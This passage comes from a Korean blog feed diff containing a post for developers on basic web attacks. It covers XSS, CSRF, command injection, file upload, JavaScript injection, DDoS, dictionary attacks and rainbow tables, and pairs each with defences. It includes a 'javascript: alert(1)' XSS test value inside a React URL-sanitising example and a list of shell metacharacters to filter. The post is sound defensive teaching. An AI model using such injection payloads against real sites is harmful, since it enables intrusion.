+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dangerousURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dangerousURL&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;safeURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isSafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dangerousURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dangerousURL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;safeURL&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ReactDOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SafeURL&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;dangerousURL=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; javascript: alert(1)&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;text=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Click me!&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;/&amp;gt;,&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;csrf-attack&quot;&gt;CSRF Attack&lt;/h2&gt;
+
+&lt;p&gt; Cross-Site Request Forgery라고 부른다. 공격자가 서비스 사용자를 이용하여 요청을 보내는 공격을 말한다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/csrf.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 예를 들어 네이버 로그인과 똑같은 화면을 제공하는 피싱 사이트가 있다고 가정해보자. 여기서 사용자가 피싱 사이트인 것을 모르고 아이디와 비밀번호를 입력하고 로그인 버튼을 누른다면 피싱 사이트는 진짜 네이버 로그인 URL에 요청할 수 있다. 만약 CSRF 취약점이 있다면 성공/실패 Response가 내려올 것이다. 이를 이용하여 해커는 계정 정보를 저장하고 진짜 사이트로 이동시킨 후 모른척 할 수 있다. 이러면 사용자는 해킹당했다는 사실조차 모를 수 있다.&lt;/p&gt;
+
+&lt;p&gt; 과거 2008년엔 CSRF 취약점을 이용해서 옥션 사용자 개인정보를 유출했다고 한다. 이 사례는 CSRF 공격 코드가 포함된 이메일을 관리자에게 보내 관리자 권한을 탈취했다고 한다. 이처럼 간단한 공격인 것 치고 아주 치명적인 공격이다.&lt;/p&gt;
+
+&lt;p&gt; 공격이 쉬운 만큼 방어도 꽤 쉬운편에 속한다. 대표적으로 다음 세 가지 방법이 있다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Referer Check&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;HTTP Referer를 확인하여 허용된 Referer의 요청만 허락하도록 설정하는 방어 방법이다. 단, HTTP 변조를 통해 쉽게 뚫을 수 있으므로 추천하지 않는다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CSRF Token&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;모든 요청에 토큰을 발급하여 서버에서 검증하는 방어 방법이다. 발급된 토큰을 서버로 전달하지 않으면 요청이 허락되지 않기 때문에 효과적이다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CAPTCHA&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;캡챠는 사람이 요청한 것이 맞는지 검증하는 방법이지만 CSRF 공격에도 효과적이다. 사실상 CSRF Token이 하는 것과 똑같고 겸사겸사 로봇 여부 확인도 가능하다.
+        &lt;h2 id=&quot;command-injection&quot;&gt;Command Injection&lt;/h2&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; Command Injection은 쉘을 실행시키는 로직을 이용한 공격이다. 시스템 권한이 탈취되는 것이나 마찬가지기 때문에 매우 치명적이다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/command-injection.png&quot; /&gt;
+  &lt;figcaption&gt;WebShell이 열린거나 마찬가지&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 각 언어마다 쉘 명령을 실행시키는 함수가 존재한다. 예를 들어, Java의 &lt;code class=&quot;highlighter-rouge&quot;&gt;System.runtime()&lt;/code&gt;이나 &lt;code class=&quot;highlighter-rouge&quot;&gt;Runtime.exec()&lt;/code&gt;, Python의 &lt;code class=&quot;highlighter-rouge&quot;&gt;exec()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system()&lt;/code&gt; 등이 있다. 마찬가지로 각 언어마다 존재하는 &lt;code class=&quot;highlighter-rouge&quot;&gt;eval()&lt;/code&gt; 함수도 매우 취약하다.&lt;/p&gt;
+
+&lt;p&gt; 위 사진을 보듯 쉘 명령을 실행시키는 함수를 이용하여 악성 명령을 삽입 할 수 있게 되면 사실상 해커를 위한 WebShell이 된다. 이때부턴 해커들의 잔치가 시작된다. 아마 나라면 바로 방화벽부터 풀지 않을까?&lt;/p&gt;
+
+&lt;p&gt; 여담으로 이 공격에 성공했다면 흔히 뉴스에서 접할 수 있는 Deface Attack을 할 수 있다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/deface.jpg&quot; /&gt;
+  &lt;figcaption&gt;조금 다르지만 이것도 Deface의 일종이다&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; Deface 공격은 해킹에 성공했음을 과시하는 방법이다. 서버에 존재하는 파일을 변조해야 하기에 Command Injection을 이용하면 손쉽게 해낼 수 있다.&lt;/p&gt;
+
+&lt;p&gt; Command Injection 공격의 방어 방법은 매우 간단하다. 쉘 명령을 실행시키는 시스템 함수를 사용하지 않는 것이다. 만약 꼭 사용해야한다면 &lt;code class=&quot;highlighter-rouge&quot;&gt;|, &amp;amp;, ;, &amp;gt;, &amp;lt;&lt;/code&gt;와 같은 민감한 문자는 필터링하도록 하자.&lt;/p&gt;
+
+&lt;h2 id=&quot;file-upload-attack&quot;&gt;File Upload Attack&lt;/h2&gt;
+
+&lt;p&gt; 공격 스크립트가 담긴 파일을 서버로 업로드하는 공격이다. WebShell이 가능한 코드가 담긴 파일을 업로드하고 해커가 URL을 통해 접근 가능해지면 Command Injection과 같은 효과를 볼 수 있다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/file-upload-attack.png&quot; /&gt;
+  &lt;figcaption&gt;이미지 출처를 모르겠다...&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 해커가 개발 언어에 따른 공격 스크립트를 업로드하는데 성공하고 해당 파일을 브라우저로 접근 할 수 있다면 Command Injection처럼 WebShell 접근이 가능하다. 꼭 PHP, JSP와 같은 스크립트가 아니더라도 CSRF Attack을 유발시킬 수 있는 파일을 업로드할 수도 있다.&lt;/p&gt;
+
+&lt;p&gt; 방어 방법은 다음 절차를 모두 따르는 것이 좋다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;확장자와 파일 타입을 검사하여 허락된 타입만 저장한다.&lt;/li&gt;
+  &lt;li&gt;해커가 파일을 찾을 수 없도록 업로드 파일의 이름과 확장자를 난수화하여 저장한다.&lt;/li&gt;
+  &lt;li&gt;특수 문자가 포함된 경우 업로드를 막는다. (Null byte Injection 방지)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; 요즘은 클라우드 서비스가 제공해주는 파일 스토리지를 이용하기도하고 프레임워크에서 제공해주는 기능을 쉽게 이용할 수 있어서 예전보다 막기 쉬워졌다.&lt;/p&gt;
+
+&lt;h3 id=&quot;주의-할-점-2&quot;&gt;주의 할 점&lt;/h3&gt;
+
+&lt;p&gt; HTTP는 조작될 수 있으므로 &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;을 믿지 않는 것이 좋다. 그리고 꼭 WebShell을 하기 위한 공격이 아닌 서버 자체를 죽이기 위해 대용량 파일을 계속해서 보낼 수도 있다. 이를 막기 위해 파일 크기 제한도 설정하자. 그리고 가급적 같은 서버가 아닌 파일 서버를 별도로 두는 것을 추천한다.&lt;/p&gt;
+&lt;h2 id=&quot;javascript-injection&quot;&gt;JavaScript Injection&lt;/h2&gt;
+
+&lt;p&gt; 브라우저에서 자바스크립트를 삽입시키는 공격이다. 브라우저에서 제공하는 Console을 통해 조작 가능하다. 만약 Client-Side에 민감한 데이터를 넣어놨다면 해당 공격을 통해 탈취가 가능하다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/javascript-injection.png&quot; /&gt;
+  &lt;figcaption&gt;아주 간단한 JavaScript Injection 사례&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 사실 위 사진처럼 브라우저를 통해 언제든지 자바스크립트 명령어를 실행시킬 수 있기 때문에 클라이언트에 민감한 데이터를 넣는건 자살행위다. 또한 데이터가 아니더라도 클라이언트에서 로직을 결정하는 경우 함수 변조도 가능하기 때문에 가급적 서버에서 결정하도록 수정해야한다. 예를 들어, 웹 게임에서 수치를 JavaScript Injection을 통해 변경하고 저장하는 로직을 변경하면 손쉽게 1등을 할 수도 있다. 이를 방지하기 위해선 서버에서 검증하는 로직이 필요하다.&lt;/p&gt;
+
+&lt;p&gt; 위 사례에서 설명했던 것 처럼 다음 두 가지 방어 절차를 따르는 것이 좋다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;클라이언트엔 민감한 데이터를 절대 Plain하게 넣지 않는다.&lt;/li&gt;
+  &lt;li&gt;데이터 유효성 검사가 필요한 경우 서버에서 처리하도록 한다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;ddos&quot;&gt;DDoS&lt;/h2&gt;
+
+&lt;p&gt; Distributed Denial of Service라고 부른다. 직역하면 분산 서비스 거부 공격이 된다. 그 이름처럼 분산된 시스템을 이용하여 서버에 비정상적으로 많은 트래픽을 보내 마비시키는 공격이다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/ddos.png&quot; /&gt;
+  &lt;figcaption&gt;수 많은 PC를 이용해 공격한다&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 공격자는 수 많은 PC를 이용하여 서버에 트래픽을 보낸다. 이때 몰래 심어놓은 좀비 PC를 이용할 수도 있고 본인이 사용할 수 있는 PC를 이용할 수도 있다. 많은 트래픽이 발생하면 서비스에 부하가 생겨 느려지거나 서버가 죽을 수 있다.&lt;/p&gt;
+
+&lt;p&gt; DDoS는 제일 단순한데 제일 막기 힘든 공격이다. 그나마 예방하기 위해선 다음과 같은 것들을 고려할 수 있다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;당장 서버가 죽지 않도록 확장 가능한 분산 시스템을 설계한다.&lt;/li&gt;
+  &lt;li&gt;공격 IP를 필터링한다.&lt;/li&gt;
+  &lt;li&gt;서비스 지역 외의 IP를 막는다.&lt;/li&gt;
+  &lt;li&gt;DDoS를 막아주는 전문 업체의 솔루션을 구매한다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;dictionary-attack&quot;&gt;Dictionary Attack&lt;/h2&gt;
+
+&lt;p&gt; 미리 데이터베이스에 등록해놓은 수많은 문자열을 암호로 대입하는 공격이다. &lt;a href=&quot;https://ko.wikipedia.org/wiki/%EB%AC%B4%EC%B0%A8%EB%B3%84_%EB%8C%80%EC%9E%85_%EA%B3%B5%EA%B2%A9&quot;&gt;Brute Force&lt;/a&gt;의 일종이다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/dictionary-attack.png&quot; /&gt;
+  &lt;figcaption&gt;미리 등록된 문자열로 무작정 대입한다&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 하나만 걸려라 공격이라고도 볼 수 있다. 많은 웹 사이트에서 간단한 단어로 비밀번호를 등록하지 못하게 하는 이유기도 하다.&lt;/p&gt;
+
+&lt;p&gt; 이 공격을 막기 위해선 의미가 있는 간단한 단어는 비밀번호로 등록하지 못하게 막는 것이 좋다. 그 다음 선택으로는 &lt;code class=&quot;highlighter-rouge&quot;&gt;Account Lockout Policy&lt;/code&gt;를 도입하여 몇 회 이상 로그인에 실패할 경우 계정을 잠그거나 OTP 같은 &lt;code class=&quot;highlighter-rouge&quot;&gt;2-factor&lt;/code&gt; 인증을 도입할 수 있다.&lt;/p&gt;
+
+&lt;h2 id=&quot;rainbow-table&quot;&gt;Rainbow Table&lt;/h2&gt;
+
+&lt;p&gt; 평문을 해시 함수로 만든 문자열을 모두 저장시켜 놓은 표를 말한다. 주로 계정 데이터 탈취 후 암호 원문을 알아내기 위해 사용한다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/rainbow-table.png&quot; /&gt;
+  &lt;figcaption&gt;https://ko.wikipedia.org/wiki/레인보_테이블&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 쉽게 안뚫리기 위해서 다음과 같은 방법을 이용할 수 있다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Salt 사용&lt;/li&gt;
+  &lt;li&gt;Key Stretching&lt;/li&gt;
+  &lt;li&gt;PBKDF2, BCrypt 등의 암호화 알고리즘 사용 (위 두 가지가 포함된다)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;모의해킹-사이트&quot;&gt;모의해킹 사이트&lt;/h2&gt;
+
+&lt;p&gt; 웹 해킹을 직접 해볼 수 있는 여러 사이트, 프로젝트가 존재한다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://webhacking.kr&quot;&gt;webhacking.kr&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://suninatas.com/&quot;&gt;suninatas&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.hackthissite.org/&quot;&gt;hackthissite&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/WebGoat/WebGoat&quot;&gt;WebGoat&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; 사실 필자가 경험해본 사이트는 &lt;a href=&quot;https://webhacking.kr&quot;&gt;webhacking.kr&lt;/a&gt; 뿐이다. 과거엔 어두운 배경이었는데 사이트 관리자가 바뀌고나서 디자인도 바뀐 듯 하다.&lt;/p&gt;
+
+&lt;h2 id=&quot;마치며&quot;&gt;마치며&lt;/h2&gt;
+
+&lt;p&gt; 해킹은 뭔가 멋있지만 어려운 것이라고 느끼는 개발자가 많다. 하지만 공격을 막는 입장에서 본다면 방어는 생각보다 간단하는 것을 알 수 있다. 만약 필자처럼 소프트웨어를 만드는 개발자라면 무리해서 해킹 기법을 익힐 필요는 없다. 그런 일은 더 뛰어난 보안 전문가가 해줄 것이다. 그럼에도 불구하고 우리가 만든 소프트웨어를 지키기 위해 최소한의 상식을 익혀두고 방어하는 것은 좋다고 생각한다. 필자가 생각하기에 &lt;strong&gt;마음가짐 세 가지만 기억&lt;/strong&gt;한다면 충분하다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;외부 요청은 모두 의심하자.&lt;/li&gt;
+  &lt;li&gt;특수문자 필터링은 매우 중요하다.&lt;/li&gt;
+  &lt;li&gt;프레임워크, 라이브러리, 브라우저가 잘해주지만 무작정 믿지는 말자.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; 추가로 보안에 대해서 더 알고 싶다면 &lt;a href=&quot;https://owasp.org/&quot;&gt;https://owasp.org/&lt;/a&gt;에서 여러 사례를 읽어볼 수 있다. 그리고 OWASP에서 제공하는 &lt;a href=&quot;https://cheatsheetseries.owasp.org/index.html&quot;&gt;치트 시트&lt;/a&gt;도 있으니 다양한 공격 기법을 알고싶다면 해당 문서도 읽어보자.&lt;/p&gt;
+
+&lt;p&gt; 다음은 사내 스터디에서 사용한 슬라이드 자료다. 위 내용과 큰 차이는 없다.&lt;/p&gt;
+
+&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/key/4Tq4nt75krxOPX&quot; width=&quot;100%&quot; height=&quot;485&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;</content><author><name>kciter</name></author><category term="hacking" /><category term="security" /><category term="web" /><summary type="html"> 이번 포스팅에선 아주 중요하지만 프로그래밍 교육 과정에서 크게 다루지 않는 보안에 대해 이야기 해보려고 한다. 최근엔 프레임워크나 라이브러리 차원에서 잘 막아주기 때문에 큰 언급없이 넘어가는 경우가 많지만 소프트웨어 개발자는 꼭 보안 전문가가 아니더라도 기초적인 공격 방법에 대해 이해하고 방어하는 방법을 알아야 할 필요가 있다.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/2021-02-28-basic-web-hacking/thumbnail.png" /></entry><entry><title type="html">MongoDB 이해하기</title><link href="http://localhost:4000/posts/about-mongodb" rel="alternate" type="text/html" title="MongoDB 이해하기" /><published>2021-02-25T00:00:00+09:00</published><updated>2021-02-25T00:00:00+09:00</updated><id>http://localhost:4000/posts/about-mongodb</id><content type="html" xml:base="http://localhost:4000/posts/about-mongodb">&lt;p&gt; 사내에서 MongoDB를 잘 쓰기위한 스터디를 하게되어 이번 기회에 관련 자료를 정리하기로 했다. MongoDB가 왜 필요한지, 더 잘사용하기 위해서 무엇이 필요한지를 중심으로 처음 MongoDB를 사용할 때 도움이 될 만한 내용으로 정리했다.&lt;/p&gt;
 
 &lt;figure&gt;
   &lt;img src=&quot;/assets/img/2021-02-25-about-mongodb/toc.png&quot; /&gt;
